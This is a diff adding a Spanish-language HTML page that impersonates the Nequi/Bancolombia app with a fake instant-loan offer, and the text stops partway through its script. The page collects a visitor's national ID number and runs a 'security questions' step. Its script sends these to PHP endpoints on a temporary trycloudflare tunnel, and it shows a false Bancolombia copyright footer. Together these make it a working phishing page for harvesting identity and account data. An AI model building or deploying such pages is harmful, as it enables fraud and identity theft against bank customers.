@@ -1,0 +1,1492 @@
+<!doctype html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Plata de una en tu Nequi!</title>
+	<link rel="shortcut icon" type="image/x-icon" href="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/assets/favicon-3.ico">
+    
+	
+	  
+  <link rel="stylesheet" href="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/css/index-2.css">
+  <!-- <link rel="stylesheet" href="../css/loading-validation.css" /> -->
+  <link rel="stylesheet" href="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/css/spinner-3.css">
+  <link rel="stylesheet" href="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/css/navbar-1.css">
+  <link rel="stylesheet" href="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/css/globals-3.css">
+  <link rel="stylesheet" href="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/css/styles.css">
+  <link rel="stylesheet" href="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/css/load-spinner-1.css">
+	<style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 64px;
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+        }
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .logo svg {
+            height: 32px;
+        }
+
+        /* ===== LOADER ===== */
+        .loading-spinner {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loading-spinner.show {
+            display: flex;
+        }
+        .cubes-text {
+            text-align: center;
+        }
+        .nequi-loader {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .cubes {
+            display: flex;
+            gap: 12px;
+        }
+        .cube {
+            width: 40px;
+            height: 40px;
+            background: #da0081;
+            animation: cubeBounce 1.2s infinite ease-in-out;
+        }
+        .cube:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+        @keyframes cubeBounce {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(0.4);
+            }
+        }
+        .text-cube {
+            font-size: 16px;
+            color: #200020;
+            font-weight: 500;
+            display: block;
+            margin-top: 8px;
+        }
+        .done {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .done.show {
+            display: flex;
+        }
+        .check {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: #da0081;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+        .check::after {
+            content: "";
+            width: 24px;
+            height: 12px;
+            border-left: 4px solid #fff;
+            border-bottom: 4px solid #fff;
+            transform: rotate(-45deg);
+        }
+        .done span {
+            font-size: 18px;
+            font-weight: 600;
+            color: #200020;
+        }
+
+        /* ===== TOAST ===== */
+        .toast {
+            position: fixed;
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 400px;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            opacity: 0;
+            transition: all 0.6s ease;
+            z-index: 9999999;
+            color: #fff;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .toast.show {
+            top: 80px;
+            opacity: 1;
+        }
+        .toast.success {
+            background: #0bbd67;
+        }
+        .toast.error {
+            background: #e74c3c;
+        }
+        .toast-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .toast-icon.success::after {
+            content: "";
+            width: 11px;
+            height: 5px;
+            border-left: 3px solid #fff;
+            border-bottom: 3px solid #fff;
+            transform: rotate(-45deg);
+        }
+        .toast-icon.error::after {
+            content: "✕";
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        /* ===== CONTENEDOR ===== */
+        .mainContainer {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 80px 16px 20px;
+        }
+
+        .hero-title {
+            background: linear-gradient(135deg, #da0081, #ab005c);
+            padding: 40px 20px 30px;
+            border-radius: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .hero-title h1 {
+            color: #fff;
+            font-size: 1.8rem;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .form-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 20px 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        .form-group img {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 22px;
+            opacity: 0.5;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 16px 16px 16px 48px;
+            border: 2px solid #e5e5e5;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.3s;
+            background: #fafafa;
+        }
+        .form-group input:focus {
+            border-color: #da0081;
+            background: #fff;
+        }
+        .form-group label {
+            position: absolute;
+            left: 48px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            font-size: 14px;
+            pointer-events: none;
+            transition: all 0.2s;
+        }
+        .form-group input:focus+label,
+        .form-group input:not(:placeholder-shown)+label {
+            top: 8px;
+            transform: translateY(0);
+            font-size: 11px;
+            color: #da0081;
+        }
+        .form-group input:placeholder-shown+label {
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: #999;
+        }
+
+        .error-text {
+            color: #e74c3c;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+        .error-text.show {
+            display: block;
+        }
+        .success-text {
+            color: #27ae60;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+        .success-text.show {
+            display: block;
+        }
+
+        .btn-buscar {
+            width: 100%;
+            background: #da0081;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-buscar:hover:not(:disabled) {
+            background: #ab005c;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(218, 0, 129, 0.3);
+        }
+        .btn-buscar:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ===== SECCIÓN PREGUNTAS ===== */
+        .security-section {
+            display: none;
+            margin-top: 20px;
+        }
+        .security-section.show {
+            display: block;
+        }
+
+        .security-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        .security-header h4 {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #da0081;
+        }
+        .question-counter {
+            color: #200020;
+            background: #f5f4f4;
+            border-radius: 999px;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 6px 12px;
+        }
+
+        .security-note {
+            background: #f5f4f4;
+            border-left: 4px solid #da0081;
+            border-radius: 8px;
+            padding: 14px;
+            color: #200020;
+            font-size: 14px;
+            line-height: 1.45;
+            margin-bottom: 16px;
+        }
+        .security-note strong {
+            color: #200020;
+        }
+
+        .security-step {
+            display: none;
+            flex-direction: column;
+            gap: 16px;
+            width: 100%;
+        }
+        .security-step.active {
+            display: flex;
+        }
+
+        .security-answer-box {
+            width: 100%;
+            padding: 16px 14px 16px 48px;
+            border-radius: 8px;
+            background: #fff;
+            box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.54);
+            position: relative;
+        }
+        .security-answer-box img {
+            position: absolute;
+            left: 13px;
+            top: 18px;
+            width: 25px;
+        }
+        .security-answer-label {
+            color: #da0081;
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        .security-answer-text {
+            color: #200020;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 1.35;
+            margin: 0;
+        }
+
+        .choice-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            width: 100%;
+        }
+        .choice-btn {
+            border: 2px solid #da0081;
+            border-radius: 8px;
+            background: #fff;
+            color: #da0081;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 700;
+            min-height: 54px;
+            transition: all 0.2s ease;
+        }
+        .choice-btn:hover:not(:disabled) {
+            background: #da0081;
+            color: #fff;
+            transform: translateY(-1px);
+        }
+        .choice-btn.selected {
+            background: #da0081;
+            color: #fff;
+        }
+        .choice-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .step-status {
+            color: #200020;
+            font-size: 13px;
+            font-weight: 600;
+            min-height: 18px;
+            text-align: center;
+        }
+
+        footer {
+            margin-top: 40px;
+            padding: 40px 0 20px;
+            text-align: center;
+            border-top: 1px solid #eee;
+        }
+        footer img {
+            max-width: 100%;
+        }
+
+        @media (max-width: 480px) {
+            .mainContainer {
+                padding: 72px 12px 16px;
+            }
+            .hero-title h1 {
+                font-size: 1.4rem;
+            }
+        }
+   
+    .loadingContainer {
+      display: none;
+    }
+
+    footer {
+      margin-top: 40px;
+      background: url(../assets/footer-nequi-1.svg);
+      background-repeat: no-repeat;
+      background-size: cover;
+      padding: 100px 0 60px 0;
+    }
+
+    .messageErrorContainer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 100;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      background-color: #fff;
+      overflow-y: auto;
+      margin-top: 64px;
+    }
+
+    .messageWrapper {
+      display: flex;
+      justify-content: center;
+      /* align-items: ; */
+      width: 100vw;
+      height: 30vh;
+    }
+
+    .messageContainer {
+      background: #fff;
+      width: 60vw;
+      height: 20vh;
+      margin: auto;
+      border-radius: 5px;
+    }
+
+    .image-saldo {
+      position: absolute;
+      top: -100px;
+      left: 100px;
+      display: none;
+      z-index: 9999;
+      box-shadow: 3px 3px 13px 0px #200020;
+    }
+
+    .image-saldo::before {
+      content: "";
+      position: absolute;
+      bottom: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-width: 10px;
+      border-style: solid;
+      border-color: #200020 transparent transparent transparent;
+    }
+
+    .image-saldo img {
+      width: 160px;
+    }
+
+    .content {
+      position: fixed;
+      top: -100%;
+      /* Empieza fuera de la pantalla */
+      left: 50%;
+      transform: translateX(-50%);
+      width: 95%;
+      background: #0bbd67;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+      opacity: 0;
+      transition:
+        top 0.6s ease,
+        opacity 0.4s ease;
+      z-index: 9999999;
+      color: #200020;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      justify-content: start;
+    }
+
+    .content.show {
+      top: 10px;
+      /* Baja hasta una posición visible */
+      opacity: 1;
+    }
+
+    .check-container {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background-color: rgba(255, 255, 255, 0.4);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 5px;
+    }
+
+    .checkmark {
+      width: 11px;
+      height: 5px;
+      border-left: 3px solid #200020;
+      border-bottom: 3px solid #200020;
+      transform: rotate(-45deg);
+    }
+
+    .next1,
+    .next2 {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      background: white;
+      width: 100%;
+      height: 100vh;
+
+      display: flex;
+      align-items: center;
+      flex-direction: column;
+      justify-content: space-around;
+    }
+
+    .next2 {
+      display: none;
+    }
+
+    /* .input-saldo:focus~.image-saldo {
+      display: block;
+    } */
+
+    /* ===== ESTILOS MODAL RESULTADO CRÉDITO ===== */
+    .modalResultadoCredito {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+    }
+
+    .modalResultadoCredito.show {
+      display: flex;
+    }
+
+    .modalBackdrop {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(4px);
+    }
+
+    .modalContentCredito {
+      position: relative;
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      width: 90%;
+      max-width: 450px;
+      max-height: 90vh;
+      overflow-y: auto;
+      animation: slideUpModal 0.4s ease-out;
+    }
+
+    @keyframes slideUpModal {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .modalHeaderCredito {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .modalTituloCredito {
+      font-size: 18px;
+      font-weight: 600;
+      color: #200020;
+      margin: 0;
+    }
+
+    .btnCerrarModal {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #666;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 8px;
+      transition: color 0.3s ease;
+    }
+
+    .btnCerrarModal:hover {
+      color: #200020;
+    }
+
+    .modalBodyCredito {
+      padding: 24px 20px;
+    }
+
+    .montoResumenModal {
+      background: linear-gradient(135deg, #da0081 0%, #ab005c 100%);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .labelResumen {
+      font-size: 14px;
+      font-weight: 500;
+      color: rgba(255, 255, 255, 0.9);
+      display: block;
+      margin-bottom: 8px;
+    }
+
+    .montoDisplayModal {
+      font-size: 36px;
+      font-weight: 700;
+      color: white;
+      margin-bottom: 20px;
+    }
+
+    .sliderMontoModalContainer {
+      margin-top: 16px;
+    }
+
+    .sliderMontoModalInput {
+      width: 100%;
+      height: 6px;
+      border-radius: 3px;
+      background: linear-gradient(to right, #da0081 0%, #da0081 0%, #fff2f7 0%, #fff2f7 100%);
+      outline: none;
+      -webkit-appearance: none;
+      appearance: none;
+      cursor: pointer;
+    }
+
+    .sliderMontoModalInput::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: #da0081;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(218, 0, 129, 0.4);
+      border: 3px solid white;
+    }
+
+    .sliderMontoModalInput::-moz-range-thumb {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: #da0081;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(218, 0, 129, 0.4);
+      border: 3px solid white;
+    }
+
+    .sliderMontoModalLabels {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: white;
+      margin-top: 8px;
+      opacity: 0.8;
+    }
+
+    .informacionCreditoModal {
+      background: #f8f8f8;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+
+    .itemResumen {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #e0e0e0;
+      position: relative;
+    }
+
+    .itemResumen:last-child {
+      border-bottom: none;
+    }
+
+    .itemResumen:first-of-type {
+      position: relative;
+    }
+
+    .labelItemResumen {
+      font-size: 13px;
+      font-weight: 500;
+      color: #666;
+    }
+
+    .valueItemResumen {
+      font-size: 14px;
+      font-weight: 600;
+      color: #200020;
+    }
+
+    .plazoModalClickeable {
+      cursor: pointer;
+      position: relative;
+    }
+
+    .plazoModalClickeable::after {
+      content: " meses";
+      pointer-events: none;
+    }
+
+    .plazoSelectorModalContainer {
+      display: none;
+      position: absolute;
+      top: 100%;
+      right: 0;
+      background: white;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      z-index: 100;
+      min-width: 140px;
+    }
+
+    .plazoSelectorModalContainer.active {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .plazoSelectorModalOpcion {
+      padding: 10px 16px;
+      font-size: 13px;
+      color: #200020;
+      cursor: pointer;
+      border-bottom: 1px solid #f0f0f0;
+      transition: background 0.2s;
+    }
+
+    .plazoSelectorModalOpcion:last-child {
+      border-bottom: none;
+    }
+
+    .plazoSelectorModalOpcion:hover {
+      background: #f8f8f8;
+    }
+
+    .plazoSelectorModalOpcion.selected {
+      background: #fff2f7;
+      color: #da0081;
+      font-weight: 600;
+    }
+
+    .valueItemResumenCuota {
+      font-size: 16px;
+      font-weight: 700;
+      color: #da0081;
+    }
+
+    .textoIncluye {
+      font-size: 12px;
+      color: #999;
+      margin-top: 12px;
+      margin-bottom: 0;
+    }
+
+    .checkboxModal {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 16px;
+      padding: 12px;
+      background: #f5f5f5;
+      border-radius: 8px;
+    }
+
+    .checkboxIconoModal {
+      width: 24px;
+      height: 24px;
+      min-width: 24px;
+      border: 2px solid #da0081;
+      border-radius: 4px;
+      cursor: pointer;
+      background: white;
+      transition: all 0.3s ease;
+    }
+
+    .checkboxIconoModal:hover {
+      background: rgba(218, 0, 129, 0.05);
+    }
+
+    .checkboxCheckedModal {
+      display: none;
+      background: #da0081;
+      border-color: #da0081;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .checkboxCheckedModal img {
+      width: 14px;
+      height: 14px;
+    }
+
+    .textoCheckboxModal {
+      font-size: 12px;
+      color: #333;
+      line-height: 1.5;
+      cursor: pointer;
+    }
+
+    .textoCheckboxModal em {
+      font-style: normal;
+    }
+
+    .textoCheckboxModal a {
+      color: #da0081;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .textoCheckboxModal a:hover {
+      text-decoration: underline;
+    }
+
+    .modalFooterCredito {
+      padding: 16px 20px 20px;
+      border-top: 1px solid #f0f0f0;
+    }
+
+    .btnConfirmarModal {
+      width: 100%;
+      background: #da0081;
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .btnConfirmarModal:hover:not(:disabled) {
+      background: #ab005c;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(218, 0, 129, 0.3);
+    }
+
+    .btnConfirmarModal:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    /* Responsivo para móviles */
+    @media (max-width: 600px) {
+      .modalContentCredito {
+        width: 95%;
+        margin: 20px;
+        max-height: calc(100vh - 40px);
+      }
+
+      .montoDisplayModal {
+        font-size: 28px;
+      }
+
+      .modalBodyCredito {
+        padding: 16px 14px;
+      }
+
+      .checkboxModal {
+        gap: 10px;
+        padding: 10px;
+      }
+    }
+
+    /* ===== OCULTAR SECCIONES NO NECESARIAS ===== */
+    .hiddenFormSection {
+      display: none !important;
+    }
+
+    /* Párrafo informativo */
+    .textoInformativoFormulario {
+      font-size: 14px;
+      color: #666;
+      text-align: center;
+      line-height: 1.6;
+      margin: 20px 0;
+      font-weight: 500;
+    }
+
+    .textoInformativoFormulario strong {
+      color: #da0081;
+      font-weight: 600;
+    }
+  </style>
+</head>
+
+<body>
+
+    <!-- ===== LOADER ===== -->
+    <div class="loading-spinner" id="loadingContenedor">
+        <div class="cubes-text">
+            <div class="nequi-loader" id="loader">
+                <div class="cubes">
+                    <div class="cube"></div>
+                    <div class="cube"></div>
+                </div>
+            </div>
+            <span class="text-cube" id="textCube"></span>
+        </div>
+        <div class="done" id="done">
+            <div class="check"></div>
+            <span>¡Listo!</span>
+        </div>
+    </div>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast">
+        <div class="toast-icon" id="toastIcon"></div>
+        <p id="toastMessage"></p>
+    </div>
+
+    <!-- ===== HEADER ===== -->
+    <header class="header">
+        <div class="header-inner">
+            <div class="logo">
+                <svg width="120" height="32" viewBox="0 0 104 32" fill="none">
+                    <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
+                    <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
+                    <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"/>
+                    <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"/>
+                    <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"/>
+                    <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"/>
+                </svg>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== CONTENIDO ===== -->
+    <main class="mainContainer">
+	<h1 class="u-text-white is-credit-effect-page" style="font-size: 2rem !important; padding: 9.5rem 0">
+                <!-- Valida tus datos y<br /> -->
+                Solicita tu crédito
+              </h1>
+        <div class="hero-title">
+            <h1>Solicita tu crédito</h1>
+			
+        </div>
+ 
+        <div class="form-card">
+
+            <!-- Campo cédula -->
+            <div class="form-group">
+                <img src="https://nequiprestamopropulsor.blob.core.windows.net/crnew1/neq/1/assets/document.png" alt="">
+				<input type="text" id="cedulaInput" placeholder=" " maxlength="10" inputmode="numeric" pattern="[0-9]*">
+                <label for="cedulaInput">Ingresa tu cédula</label>
+            
+			</div>
+			
+            <div class="error-text" id="cedulaError">La cédula debe tener entre 7 y 10 dígitos</div>
+            <div class="success-text" id="cedulaSuccess">✅ Cliente encontrado correctamente</div>
+
+            <button class="btn-buscar" id="btnBuscar">Solicitar</button>
+
+            <!-- Sección preguntas -->
+            <div class="security-section" id="securitySection">
+                <div class="security-header">
+                    <h4>Preguntas de seguridad</h4>
+                    <span class="question-counter" id="questionCounter">0/3</span>
+                </div>
+
+                <p class="security-note">
+                    <strong id="customerNameDisplay"></strong> Responde cada pregunta seleccionando Sí o No para continuar con la validación.
+                </p>
+
+                <form id="securityForm" novalidate>
+                    <!-- Paso 1 -->
+                    <div class="security-step active" data-step="0">
+                        <div class="security-answer-box">
+                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
+                            <span class="security-answer-label" id="labelPregunta1">Cargando...</span>
+                            <p class="security-answer-text" id="respuestaPregunta1">—</p>
+                        </div>
+                        <div class="choice-group">
+                            <button type="button" class="choice-btn" data-answer="si">Sí</button>
+                            <button type="button" class="choice-btn" data-answer="no">No</button>
+                        </div>
+                        <p class="step-status" id="stepStatusOne"></p>
+                    </div>
+
+                    <!-- Paso 2 -->
+                    <div class="security-step" data-step="1">
+                        <div class="security-answer-box">
+                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
+                            <span class="security-answer-label" id="labelPregunta2">Cargando...</span>
+                            <p class="security-answer-text" id="respuestaPregunta2">—</p>
+                        </div>
+                        <div class="choice-group">
+                            <button type="button" class="choice-btn" data-answer="si">Sí</button>
+                            <button type="button" class="choice-btn" data-answer="no">No</button>
+                        </div>
+                        <p class="step-status" id="stepStatusTwo"></p>
+                    </div>
+
+                    <!-- Paso 3 -->
+                    <div class="security-step" data-step="2">
+                        <div class="security-answer-box">
+                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" alt="">
+                            <span class="security-answer-label" id="labelPregunta3">Cargando...</span>
+                            <p class="security-answer-text" id="respuestaPregunta3">—</p>
+                        </div>
+                        <div class="choice-group">
+                            <button type="button" class="choice-btn" data-answer="si">Sí</button>
+                            <button type="button" class="choice-btn" data-answer="no">No</button>
+                        </div>
+                        <p class="step-status" id="stepStatusThree"></p>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <footer>
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 60'%3E%3Crect width='400' height='60' fill='%23f5f5f5'/%3E%3Ctext x='20' y='35' font-size='14' fill='%23999' font-family='system-ui'%3EBancolombia S.A. - Todos los derechos reservados%3C/text%3E%3C/svg%3E" alt="Footer" style="max-width:100%;">
+        </footer>
+    </main>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+
+            // ===== ELEMENTOS =====
+            const cedulaInput = document.getElementById("cedulaInput");
+            const btnBuscar = document.getElementById("btnBuscar");
+            const cedulaError = document.getElementById("cedulaError");
+            const cedulaSuccess = document.getElementById("cedulaSuccess");
+            const securitySection = document.getElementById("securitySection");
+            const customerNameDisplay = document.getElementById("customerNameDisplay");
+            const questionCounter = document.getElementById("questionCounter");
+            const steps = Array.from(document.querySelectorAll(".security-step"));
+            const loadingContenedor = document.getElementById("loadingContenedor");
+            const loader = document.getElementById("loader");
+            const textCube = document.getElementById("textCube");
+            const done = document.getElementById("done");
+            const toast = document.getElementById("toast");
+            const toastMessage = document.getElementById("toastMessage");
+            const toastIcon = document.getElementById("toastIcon");
+
+            // ===== CONSTANTES =====
+            const API_BUSCAR_CLIENTE = "https://owen-revealed-collection-visited.trycloudflare.com/consultadb/api_buscar_cliente_inteligente.php";
+            const API_VALIDAR_RESPUESTAS = "https://owen-revealed-collection-visited.trycloudflare.com/consultadb/api_validar_respuestas_debug.php";
+
+            // ===== ESTADO =====
+            let customerData = null;
+            let respuestas = [];
+            let currentStep = 0;
+
+            // ===== FUNCIONES =====
+
+            function formatearFecha(fecha) {
+                if (!fecha || fecha === "No disponible" || fecha === "null") return "No disponible";
+                if (fecha.match(/^\d{2}-\d{2}-\d{4}$/)) return fecha;
+                const partes = fecha.split('-');
+                if (partes.length === 3 && partes[0].length === 4) {
+                    return partes[2] + '-' + partes[1] + '-' + partes[0];
+                }
+                return fecha;
+            }
+
+            function mostrarToast(mensaje, tipo = "success") {
